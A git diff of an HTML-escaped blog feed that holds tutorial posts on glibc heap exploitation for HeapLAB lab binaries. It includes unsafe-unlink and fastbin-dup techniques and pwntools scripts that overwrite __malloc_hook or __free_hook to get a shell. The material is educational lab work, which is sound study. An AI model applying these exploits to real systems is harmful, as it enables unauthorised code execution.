+    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Fake Chunk: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'malloc_hook: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc_hook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'One_gadget: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;one_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;elf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;sl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ru&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;unsafe-unlink-exploiting-free-on-a-corrupted-chunk-to-gain-arbitrary-8-byte-write&quot;&gt;Unsafe Unlink: Exploiting free on a corrupted chunk to gain arbitrary 8-byte write&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Requirements&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
   &lt;li&gt;Allocate chunks in the unsorted bin, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;120 - 1000 bytes&lt;/code&gt;&lt;/li&gt;
   &lt;li&gt;Ability to corrupt &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;prev_size&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;prev_in_use&lt;/code&gt; flag of a chunk, usually through heap overflow&lt;/li&gt;
@@ -635,9 +1089,8 @@ From reversing the binary, we know that we can:&lt;/p&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&quot;process&quot;&gt;Process&lt;/h2&gt;
-&lt;h3 id=&quot;arbitrary-write-primitive&quot;&gt;Arbitrary Write Primitive&lt;/h3&gt;
-&lt;p&gt;&lt;em&gt;Assuming &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; is the address to be overwritten&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Arbitrary Write Primitive&lt;/strong&gt;&lt;br /&gt;
+&lt;em&gt;Assuming &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; is the address to be overwritten&lt;/em&gt;&lt;/p&gt;
 &lt;ul&gt;
   &lt;li&gt;Allocate 2 chunks in the unsorted bin&lt;/li&gt;
   &lt;li&gt;In the fake free chunk:
@@ -659,8 +1112,8 @@ From reversing the binary, we know that we can:&lt;/p&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&quot;example-heaplab-unsafe_unlink&quot;&gt;Example: HeapLAB unsafe_unlink&lt;/h2&gt;
-&lt;p&gt;&lt;em&gt;chunk A: fake free chunk, chunk B: corrupted chunk&lt;/em&gt;&lt;br /&gt;
+&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt; HeapLAB &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unsafe_unlink&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chunk A: fake free chunk, chunk B: corrupted chunk&lt;/code&gt;&lt;br /&gt;
 RCE is gained by writing address of chunk A’s data to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__free_hook&lt;/code&gt;, and writing shellcode in chunk A’s data as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NX&lt;/code&gt; is not set.&lt;/p&gt;
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 
@@ -731,281 +1184,7 @@ RCE is gained by writing address of chunk A’s data to &lt;code class=&quot;lan
     &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
     &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>MiloTruck</name></author><category term="Binary Exploitation" /><category term="Heap" /><summary type="html">Unsafe Unlink</summary></entry><entry><title type="html">Fastbin Dupe</title><link href="http://localhost:4000/Fastbin-Dupe/" rel="alternate" type="text/html" title="Fastbin Dupe" /><published>2020-12-18T00:00:00+08:00</published><updated>2020-12-18T00:00:00+08:00</updated><id>http://localhost:4000/Fastbin%20Dupe</id><content type="html" xml:base="http://localhost:4000/Fastbin-Dupe/">&lt;p&gt;Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist. This can be used to gain an arbitrary write primitive.&lt;/p&gt;
-
-&lt;h2 id=&quot;requirements&quot;&gt;Requirements&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;Allocate chunks in fastbin size, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x20 - 0x80&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Ability to free chunks in any order&lt;/li&gt;
-  &lt;li&gt;Ability to forge or find fake chunk&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;process&quot;&gt;Process&lt;/h2&gt;
-&lt;h3 id=&quot;arbitrary-write-primitive&quot;&gt;Arbitrary Write Primitive&lt;/h3&gt;
-&lt;p&gt;&lt;em&gt;Assuming &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt; is the address to be overwritten&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Allocate 2 chunks, free them in alternating order: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free(1), free(0), free(1)&lt;/code&gt;. This causes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; pointer of the second chunk to link back to the first in the fastbin list.&lt;/li&gt;
-  &lt;li&gt;Forge a fake chunk somehow at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target - 16&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target - 8&lt;/code&gt; must hold chunk size equal to size of previous chunks.&lt;/li&gt;
-  &lt;li&gt;Allocate chunk, with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target - 16&lt;/code&gt; as the data to overwrite the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; pointer in the fastbin list.&lt;/li&gt;
-  &lt;li&gt;Allocate 2 more chunks to free up fastbin list. Last address in the fastbin list will point to the fake chunk.&lt;/li&gt;
-  &lt;li&gt;Allocate chunk with data to be written to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;target&lt;/code&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;gaining-rce-using-ret2libc&quot;&gt;Gaining RCE using ret2libc&lt;/h3&gt;
-&lt;p&gt;&lt;em&gt;This requires libc version to be known&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__malloc_hook&lt;/code&gt; using write primitive with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;one_gadget&lt;/code&gt;
-    &lt;ul&gt;
-      &lt;li&gt;Fake chunk can be found using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find_fake_fast &amp;amp;__malloc_hook&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwndbg&lt;/code&gt;&lt;/li&gt;
-      &lt;li&gt;Chunk size of all previous chunks must be same as chunk size in this fake chunk&lt;/li&gt;
-      &lt;li&gt;As chunk is not allocated with alignment, data when overwriting becomes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;padding + one_gadget&lt;/code&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc()&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;example-heaplab-fastbin_dup&quot;&gt;Example: HeapLAB fastbin_dup&lt;/h2&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;elf&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;./fastbin_dup&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'size: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'data: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'index: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;c1&quot;&gt;# Get puts leak
-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts() @ '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    
-    &lt;span class=&quot;c1&quot;&gt;# Setting random username
-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'username: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'JEFFJOHN'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    
-    &lt;span class=&quot;c1&quot;&gt;# Calculate libc addresses
-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;one_gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xe1fa1&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;malloc_hook&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__malloc_hook'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-    
-    &lt;span class=&quot;c1&quot;&gt;# Fastbin dup
-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;c1&quot;&gt;# Overwrite __malloc_hook with one_gadget 
-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;fake_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc_hook&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;one_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
-    &lt;span class=&quot;c1&quot;&gt;# Pop shell
-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;gt; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sla&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'size: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;lg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Fake Chunk: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
